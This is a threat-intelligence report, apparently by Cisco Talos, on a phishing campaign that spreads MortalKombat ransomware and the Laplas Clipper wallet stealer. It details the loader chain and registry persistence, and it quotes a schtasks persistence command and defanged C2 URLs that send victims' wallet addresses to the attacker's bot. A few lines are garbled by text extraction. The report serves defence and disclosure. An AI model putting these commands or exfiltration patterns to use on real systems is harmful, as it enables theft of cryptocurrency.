Leveraging cryptocurrency offers threat actors attractive benefits such as anonymity,\ndecentralization, and lack of regulation, making it more challenging to track.\nTalos recommends that users and organizations be meticulous about the recipient’s wallet address while performing cryptocurrency\ntransactions. Talos encourages updating computers with the latest security updates, implementing robust endpoint protection solutions\nwith behavioral detection capabilities, and maintaining tested, offline backup solutions for endpoints with a reasonable restoration time\nin the event of a ransomware attack.\n\n## Multi-stage attack chain delivers malware or ransomware and removes infection markers\n\nA typical infection in this campaign begins with a phishing email and kicks off a multi-stage attack chain in which the actor delivers either\nmalware or ransomware, then deletes evidence of malicious files, covering their tracks and challenging analysis.\n\nThe malicious ZIP file attached to the initial phishing email contains a BAT loader script. When a victim opens the loader script, it downloads\nanother malicious ZIP file from an attacker-controlled hosting server to the victim’s machine, inflates it automatically, and executes the\npayload, which is either the GO variant of Laplas Clipper malware or MortalKombat ransomware. The loader script will run the dropped\npayload as a process in the victim’s machine, then delete the downloaded and dropped malicious files to clean up the infection markers.\n\nInfection summary flow diagram.\n\n## Cryptocurrency-themed email lure used as initial infection vector\n\n\n-----\n\ne t a ect o ecto s a p s g e a c t e attac e s pe so ate Co ay e ts, a eg t ate g oba c yptocu e cy pay e t\ngateway. Additionally, the emails have a spoofed sender email, “noreply[at]CoinPayments[.]net”, and the email subject “[CoinPayments[.]net]\nPayment Timed Out.” A malicious ZIP file is attached with a filename resembling a transaction ID mentioned in the email body, enticing the\nrecipient to unzip the malicious attachment and view the contents, which is a malicious BAT loader.\n\nPhishing email sample.\n\n## BAT loader used to deploy Laplas Clipper malware and MortalKombat ransomware\n\nTalos observed different attacks in this campaign where the actor used the BAT loader script to download and execute either Laplas Clipper\nmalware or MortalKombat ransomware.\n\nThe BAT loader script uses the living-off-the-land binary (LoLBin) bitsadmin to download a malicious ZIP file from the attacker-controlled\ndownload server to the victim machine’s local user applications temporary folder. Using an embedded VB script, the BAT loader script inflates\nthe downloaded malicious ZIP in the “%TEMP%” location and drops a malicious executable file with double file extensions\n“<filename>.PDF.EXE”. The BAT loader script starts the dropped malware using the Windows start command and deletes the downloaded\nZIP file and the dropped payload.\n\nBAT loader downloading and executing\n\nMortalKombat ransomware. BAT loader downloading\n\nand executing Laplas Clipper malware.\n\n## MortalKombat and Laplas Clipper payloads deployed to elicit cryptocurrency gains\n\nTalos observed the threat actor deploying MortalKombat ransomware and Laplas Clipper malware in this campaign, both used to steal\ncryptocurrency from the victim.\n\n### MortalKombat ransomware functionality\n\nMortalKombat is a novel ransomware, first observed by threat researchers in January 2023, with little known about its developers and\noperating model. The name of the ransomware and the wallpaper it drops on the victim system are almost certainly a reference to the Mortal\nKombat media franchise, which encompasses a series of popular video games and films.\n\nTalos observed that MortalKombat encrypts various files on the victim machine’s filesystem, such as system, application, database, backup,\nand virtual machine files, as well as files on the remote locations mapped as logical drives in the victim’s machine. It drops the ransom note\nand changes the victim machine’s wallpaper upon the encryption process. MortalKombat did not show any wiper behavior or delete the\nvolume shadow copies on the victim’s machine. Still, it corrupts Windows Explorer, removes applications and folders from Windows startup,\nand disables the Run command window on the victim’s machine, making it inoperable. An example ransom note and the victim machine’s\nwallpaper of MortalKombat ransomware are shown below:\n\n\n-----\n\nMortalKombat’s ransom note and wallpaper.\n\nThe attacker uses qTOX, an instant messaging application available on the GitHub repository, to communicate with the victim. qTOX’s\ndeveloper claims the application offers users a secure channel without any monitoring, an attractive feature for cybercriminals. In the ransom\nnote, the attacker instructs the victim to use qTOX for communication and provides the attacker’s qTOX ID\n“DA639EF141F3E3C35EA62FF284200C29FA2E7E597EF150FDD526F9891CED372CBB9AB7B8BEC8”. The attacker also provides the\nemail address “hack3dlikeapro[at]proton[.]me” as an alternate means of communication.\n\n### Laplas Clipper functionality\n\nLaplas Clipper malware is a relatively new clipboard stealer first observed by threat researchers in November 2022. The stealer belongs to\nthe Clipper malware family, a group of malicious programs that specifically target cryptocurrency users. Laplas Clipper targets users by\nemploying regular expressions to monitor the victim machine’s clipboard for their cryptocurrency wallet address. Once the malware finds the\nvictim’s wallet address, it sends it to the attacker-controlled Clipper bot, which will generate a lookalike wallet address and overwrite it to the\nvictim’s machine’s clipboard. If victims subsequently attempt to use the lookalike wallet address while performing transactions, the result will\nbe a fraudulent cryptocurrency transaction. Laplas Clipper is available at hxxps[://]laplas[.]app for a relatively low cost, with subscription rates\nranging from $49 per week to $839 per year.\n\nLaplas Clipper purchasing options.\n\nThe Laplas Clipper developers are actively producing new variants of the malware. On December 20, 2022, the developers announced via\ntheir Telegram channel a new Clipper variant written in C++ and available as an EXE and DLL. The developers also mentioned they plan to\nrelease future updates that will add the capability to check the victim’s cryptocurrency wallet balance.\n\n\n-----\n\nLaplas Clipper developers’ announcement.\n\n## Two download URLs identified in the attacker’s infrastructure\n\nTalos spotted two download URLs associated with the attacks in this campaign. One of them reaches an attacker-controlled server via IP\naddress 193[.]169[.]255[.]78, based in Poland, to download the MortalKombat ransomware. According to Talos’ analysis, 193[.]169[.]255[.]78\nis running an RDP crawler, scanning the internet for exposed RDP port 3389.\n\nThe other URL downloads the Laplas Clipper payload from the transfer[.]sh server associated with IP address 144[.]76[.]136[.]153. The\nLaplas Clipper malware employed in the attacks communicates with the Clipper bot at “clipper[.]guru”. The Clipper bot and the communication\nURL patterns of the GO Laplas Clipper variant identified are consistent with the .Net Laplas Clipper variant reported by the security\nresearchers at [Cyble.](https://blog.cyble.com/2022/11/02/new-laplas-clipper-distributed-by-smokeloader/?ref=cisco-talos-blog)\n\n## Technical analysis of the payloads reveals unique identifiers\n\nTalos conducted extensive technical analysis on MortalKombat ransomware and the GO variant of the Laplas Clipper malware, discovering\nunique identifiers and capabilities.\n\n## MortalKombat ransomware technical analysis\n\nMortalKombat ransomware is a 32-bit Windows executable with numerous destructive capabilities. In the initial phase of its execution, it\ncopies itself into the local user profile’s applications temporary folder with a random filename. The ransomware executable filename identified\nin this campaign is “E7OKC9s3llhAD13.exe”. The ransomware also drops a JPEG image file in the local user profile’s application temporary\nfolder, which loads as the victim’s wallpaper.\n\nMortalKombat performs time stomping on the newly created file in the temporary folder by modifying the creation time with the value\n“Wednesday, ‎September ‎7, ‎2022, ‏‎8:06:35 PM”. Talos has not identified the ransomware operator’s intention behind the hardcoded date and\ntime.\n\nThe ransomware loads its encrypted, embedded resources from its .rsrc section. It decrypts the resources in the victim machine’s memory\nand generates an extensive list of file extensions for the ransomware to target, along with the ransom note and the file extension for the\nencrypted files.\n\nList of file extensions the MortalKombat targets.\n\n\n-----\n\ne a so a e estab s es pe s ste ce by c eat g a u eg st y ey t t e a e c ete a d add g t e abso ute pat o t e\nransomware executable file in the local user profile’s applications temporary folder. MortalKombat also registers its classes, filename\nextension, and icon for the encrypted files through the defaulticon registry key and shell open command keys.\n\nThe below table shows the registry key value pairs created by the ransomware:\n\n**Registry Key**\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\Alcmeter\n\nHKEY_CLASSES_ROOT\\ZJKCLJAULDZDACP\n\nHKEY_CLASSES_ROOT\\..Remember_you_got_only_24_hours_to_make_the_payment_if_you_dont_pay_prize_will_triple_Mortal_Kombat_Ra\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\ZJKCLJAULDZDACP\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\..Remember_you_got_only_24_hours_to_make_the_payment_if_you_dont_pay_prize_will_trip\n\nHKEY_CLASSES_ROOT\\ZJKCLJAULDZDACP\\DefaultIcon\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\ZJKCLJAULDZDACP\\DefaultIcon\n\nHKEY_CLASSES_ROOT\\ZJKCLJAULDZDACP\\shell\\open\\command\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\ZJKCLJAULDZDACP\\shell\\open\\command\n\nMortalKombat discovers and maps the logical drives of the victim’s machine, appends “\\*.*” and searches through all folders recursively. The\nransomware enumerates every file and matches the file extension using the extensive list of file extensions decrypted from the ransomware’s\nresource section. In the event of a match, the ransomware encrypts the files and appends a new file extension\n“..Remember_you_got_only_24_hours_to_make_the_payment_if_you_dont_pay_prize_will_triple_Mortal_Kombat_Ransomware” to the\nencrypted files. Simultaneously, the ransom note file “HOW TO DECRYPT FILES.txt” will be created in every folder where the files are\nencrypted. Upon successfully encrypting the files, the ransomware changes the victim machine’s wallpaper by loading the dropped JPEG\nimage from the local user’s application temporary folder. The ransomware also corrupts the deleted files in the recycle bin folder and changes\nthe file names and types, as seen below:\n\nModified recycle bin of the victim’s machine after\n\nMortalKombat execution.\nFinally, the ransomware removes the applications and folders from the Windows startup and disables the Windows run command window. It\ndeletes the root registry key of the installed applications in the HKEY_CLASSES_ROOT registry hive using the API RegDeletekeyA, cleaning\nup its infection markers.\n\n\n-----\n\nThe function that deletes the registry keys.\n\n## MortalKombat is likely part of the Xorist ransomware family\n\nTalos’ analysis of MortalKombat uncovered similarities with Xorist variants seen in the wild and the Xorist executable generated by the leaked\nbuilder. Xorist is a ransomware family that appeared in 2010 and has evolved with several variants created using a ransomware builder. The\nease with which the Xorist variants can be customized allows threat actors to build new variants with different names, encryption file\nextensions, and custom ransom notes.\n\nTalos found a leaked version of the Xorist builder where the builder interface options closely resembled an actual Xorist ransomware builder\n[interface, as shown in a report by PCrisk. The builder generates a ransomware executable file that the attackers can further customize.](https://www.pcrisk.com/removal-guides/9905-xorist-ransomware?ref=cisco-talos-blog#!prettyPhoto)\n\nLeaked Xorist builder interface.\n\nTalos observed that the ClassName string “X0r157” and the persistent registry key string “Alcmeter” in the MortalKombat binary are consistent\nwith the Xorist variants seen in the wild and with the ransomware executable generated by the leaked Xorist builder.\n\n\n-----\n\nCode similarities in the Xorist, MortalKombat, and\n\nleaked builder-generated sample.\nComparing the Xorist variant and the MortalKombat binaries showed Talos similarities in the code, leading us to assess with high confidence\nthat the MortalKombat ransomware belongs to the Xorist ransomware family.\n\nBindiff results of Xorist and MortalKombat\n\nRansomware.\n\n## Laplas Clipper technical analysis\n\nThe GO variant of the Laplas Clipper identified in this campaign is a 32-bit executable downloaded from the attacker-controlled hosting server\nwith persistence capabilities. In the initial phase of its execution, the Clipper decrypts a few of the embedded encrypted strings with a\ndecryption routine that first decodes the base64 encoded strings and then decrypts them with the XOR key “\\x3F” to generate the key, folder\nname, process ID file, and executable filenames.\n\nString decryption function of Laplas Clipper malware.\n\nThe below table shows the strings associated with the GO Clipper malware of this campaign:\n\n**Encrypted strings** **Decrypted strings**\n\nW10IW10PWgwHWgZeXQxaCloIXg1dBlwMXVsIDQsLWQtZDQ0NDlsJWVpZC10GXA1dCg5aC14HWVkJXlpeBg0KXA== db7db0e38e9ab3e5\n\nXFNWT09aTRFYSk1K clipper[.]guru\n\n\n-----\n\ncG5eZ295aUlZaA== OQaXPFVvfW\n\ne1tQWnxUXlVtWRFPVls= DdoeCkajRf.pid\n\na3xwfX5WTGVGcxFaR1o= TCOBAisZyL.exe\n\nAfter the string decryption routine, the Clipper establishes persistence on the victim’s machine by creating a folder using the decrypted string\n“OQaXPFVvfW” in the local user profile’s applications roaming folder and copies itself into the folder with the filename using another\ndecrypted string “TCOBAisZyL.exe.” The absolute path of the persistent location identified in this campaign is “C:\\Users\\\n<user>\\AppData\\Roaming\\OQaXPFVvfW\\TCOBAisZyL.exe.”\n\nLaplas Clipper also creates a Windows scheduled task by executing the schtasks command shown below:\n\ncmd.exe /C schtasks /create /tn OQaXPFVvfW /tr ”C:\\Users\\<user>\\AppData\\Roaming\\OQaXPFVvfW\\TCOBAisZyL.exe” /st 00:00 /du\n9999:59 /sc once /ri 1 /f\n\nThe scheduled task executes the Clipper malware every minute for 416 days on the victim’s machine, resulting in continuous monitoring of\nthe victim’s clipboard for a cryptocurrency wallet address. The attacker uses the technique of executing the malware through scheduled tasks\nto evade detection.\n\nA main handler function of the Clipper malware executes its functionality. First, it registers the victim’s machine with the Clipper bot by\nsending the victim’s desktop name and user ID. The Clipper then sends another request to the Clipper bot and receives the regular\nexpressions in the victim’s system memory. The Clipper reads the victim machine’s clipboard contents and executes a function to perform\nregular expression pattern matching to detect the cryptocurrency wallet address. When a cryptocurrency wallet address is identified, the\nClipper sends the wallet address back to the Clipper bot. In response, the Clipper receives an attacker-controlled wallet address similar to the\nvictim’s and overwrites the original cryptocurrency wallet address in the clipboard.\n\nThe regular expressions of cryptocurrency wallet addresses received by the Clipper malware from the Clipper bot are shown below:\n\n**Regular expressions received** **Cryptocurrencies**\n\n\n1[1-9A-HJ-NP-Za-km-z]{32,33}\n\n3[1-9A-HJ-NP-Za-km-z]{32,33}\n\nX[1-9A-HJ-NP-Za-km-z]{33}\n\n[1-9A-HJ-NP-Za-km-z]{44}\n\n\nDash\n\n\nBc1q[023456789acdefghjklmnpqrstuvwxyz]{38,58} Bitcoin\n\n\nq[a-z0-9]{41}\n\np[a-z0-9]{41}\n\nL[a-km-zA-HJ-NP-Z0-9]{33}\n\nM[a-km-zA-HJ-NP-Z0-9]{33}\n\n\nBitcoin Cash\n\nZcash\n\n\nltc1q[a-zA-Z0-9]{38} Litecoin\n\n0x[a-fA-F0-9]{40} Ethereum\n\nBnb1[0-9a-z]{38} Binance coin\n\nD[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32} Dogecoin\n\n\n4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\n\n8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\n\n\nMonero\n\n\nr[0-9a-zA-Z]{33} Ripple\n\n\n-----\n\nt1[a-km-zA-HJ-NP-Z1-9]{33} Tezos\n\nronin:[a-fA-F0-9]{40} Ronin\n\nT[A-Za-z1-9]{33} Tron\n\naddr1[a-z0-9]+ Cardano\n\ncosmos1[a-z0-9]{38} Cosmos\n\nCommunication with the attacker-controlled Clipper bot is performed using the HTTP GET method. Talos compiled a list of the URLs the\nClipper malware generates to communicate with the Clipper bot “clipper[.]guru”, seen below:\n\n**URLs** **Purpose**\n\n\nhxxp[://]clipper[.]guru/bot/online?guid=<DESKTOP-NAME>\\\n<USERID>&key=db7db0e38e9ab3e5e7a2b9c3bd7244f4f2221d6fef4b9c2b51e4a8ff6aea925c\n\nhxxp[://]clipper[.]guru/bot/regex?\nkey=db7db0e38e9ab3e5e7a2b9c3bd7244f4f2221d6fef4b9c2b51e4a8ff6aea925c\n\nhxxp[://]clipper[.]guru/bot/get?address=<Victims crypto wallet address copied from the\nclipboard>&key=db7db0e38e9ab3e5e7a2b9c3bd7244f4f2221d6fef4b9c2b51e4a8ff6aea925c\n\n\nRegisters Victim’s machine with\nthe clipper bot\n\nGets the regular expression\npatterns from the clipper bot\n\nSends the victim’s crypto wallet\naddress to the clipper bot\n\n\nTalos created two dummy Ethereum wallets in Metamask for analysis purposes. During our analysis, the Clipper malware sent our dummy\nEthereum wallet address to the Clipper bot from the analysis sandbox’s clipboard. In return, we received the attacker-controlled wallet\naddress that looked similar to our original wallet address.\n\nClipper malware copies the wallet address from the\n\nvictim’s clipboard.\nThe table below shows the cryptocurrency wallet address sent from our analysis machine and the corresponding address received from the\nClipper bot “clipper[.]guru”:\n\n**Cryptocurrency wallet address sent from the analysis machine** **Cryptocurrency wallet address received from the Clipper bot**\n\n0x516DE893B9c9430066bC1116Feaa6E09A6349d83 0x516Acfd0bae6e65A45e0808c6Ae7560d9622B246\n\n0xbd0b7a89674A0CFf1870b5aC65578b39172979f9 0xbd04EeD05CE7C532670A4564Ae6acbE849a7dB97\n\nThe attacker-controlled wallet addresses received from the Clipper bot are valid, and their status can be seen in the blockchain shown below:\n\n\n-----\n\nBlockchain showing the attacker-controlled wallet\n\ndetails.\n\n## Victimology\n\nTalos observed that victims of this campaign are predominantly located in the United States, with a smaller percentage of victims in the United\nKingdom, Turkey, and the Philippines.\n\n## MITRE ATT&CK TTPs\n\nThe campaign demonstrate several techniques of MITRE ATT&CK framework that the actor has employed in their attacks, most notably:\n\nCommand-Line Interface - T1059\nScripting - T1064\nExecution through API - T1106\nBITS Jobs - T1197\nRegistry Run Keys / Startup Folder - T1060\nModify Registry - T1112\nSystem Information Discovery - T1082\nFile and Directory Discovery - T1083\nQuery Registry - T1012\nPeripheral Device Discovery - T1120\nExfiltration Over Unencrypted Non-C2 Protocol - T1048.003\nData Encrypted for Impact - T1486.\n\n## Coverage\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
